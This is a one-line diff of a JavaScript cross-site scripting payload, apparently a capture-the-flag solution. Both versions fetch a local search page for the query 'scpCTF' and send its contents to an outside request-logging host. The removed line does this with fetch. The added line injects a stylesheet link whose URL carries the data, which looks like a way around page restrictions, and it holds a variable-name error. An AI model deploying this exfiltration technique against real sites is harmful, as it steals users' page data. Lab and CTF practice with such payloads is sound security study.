@@ -1,1 +1,1 @@
-fetch("http://127.0.0.1:5000/search?query=scpCTF").then(res=>res.text()).then(text=>{fetch("https://gbppwcj.request.dreamhack.games/?data="+encodeURIComponent(text))})
+fetch("http://127.0.0.1:5000/search?query=scpCTF").then(res=>res.text()).then(text=>{const l = document.createElement('link');link.rel='stylesheet';l.href='https://tdfatpz.request.dreamhack.games/?data='+ encodeURIComponent(text);document.head.appendChild(l);})
